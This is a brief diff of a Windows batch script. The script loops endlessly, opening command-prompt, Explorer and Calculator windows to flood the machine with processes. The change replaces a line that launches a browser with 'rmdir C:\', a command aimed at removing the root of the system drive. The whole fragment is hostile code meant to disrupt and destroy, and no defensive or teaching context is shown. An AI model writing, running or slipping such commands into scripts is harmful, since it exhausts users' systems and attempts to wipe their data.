@@ -3,6 +3,5 @@
 start cmd
 start explorer
 start calc
-start brave
-
+rmdir C:\
 goto loop
